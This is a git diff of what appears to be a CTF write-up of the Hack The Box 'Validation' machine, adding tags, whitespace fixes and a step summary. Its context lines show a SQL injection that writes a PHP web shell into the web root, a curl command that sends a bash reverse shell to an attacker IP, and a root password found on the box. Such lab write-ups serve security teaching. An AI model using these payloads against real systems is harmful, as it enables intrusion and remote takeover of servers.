@@ -4,7 +4,7 @@ description: "Exploiting Second-Order SQL Injection"
 date: 2024-07-13 12:00:00 -100
 image: /assets/images/HTB - Validation Pics/Validation_Thumbnail.png
 categories: [CTF]
-tags: [sql injection, privilege escalation, password reuse]    # TAG names should always be lowercase
+tags: [sql injection, privilege escalation, password reuse, docker, web application]    # TAG names should always be lowercase
 ---
 
 ## Enumeration
@@ -59,7 +59,7 @@ Let's try commenting out the rest of the statement with `-- -`
 
 The error went away once we commented out the rest of the query. This confirms that we have SQLi
 
-Let's enumerate the number of columns by adding a simple union select statement 
+Let's enumerate the number of columns by adding a simple union select statement
 
 ```SQL
 username=Jigsaw94&country=Brazil' union select  1-- -
@@ -78,7 +78,7 @@ Brazil' UNION SELECT '<?php system($_REQUEST["cmd"]); ?>' INTO OUTFILE '/var/www
 - `system()` PHP function used to execute shell commands
 - `$_REQUEST["cmd"]` PHP superglobal variable that grabs the value of cmd parameter from the HTTP request
 - `INTO OUTFILE` writes the query to a file
--  `-- -` comment out the remaining SQL
+- `-- -` comment out the remaining SQL
 
 Our SQL statement will take the value of our HTTP request and write it to `pwned.php`
 
@@ -99,6 +99,7 @@ With this confirmation of RCE. Let's curl a shell request. We'll set up our `nc`
 ```bash
 curl -X POST http://10.10.11.116/pwned.php --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/<YOURIP>/PORT 0>&1"'
 ```
+
 ![Shell Obtained](/assets/images/HTB%20-%20Validation%20Pics/Shell%20Obtained.png)
 
 We have our shell. Since python is not installed on t his container I am going to use the following to upgrade to a pty
@@ -119,7 +120,14 @@ We see a password `uhc-9qual-global-pw` here, let's try switching to root with t
 
 GG, we've obtained root on this box
 
+## Summary
 
+1. Initial enumerating discoverd Web server
+2. Utilized second-order SQLi to get RCE
+3. Connected back to our attacker machine via RCE
+4. Found & exploited the gRPC service via SQLi
+5. Discoverd config.php file with credentials
+6. Used credentails from config.php to root machine
 
 ## Vulnerabilities & Mitigation Summary
 
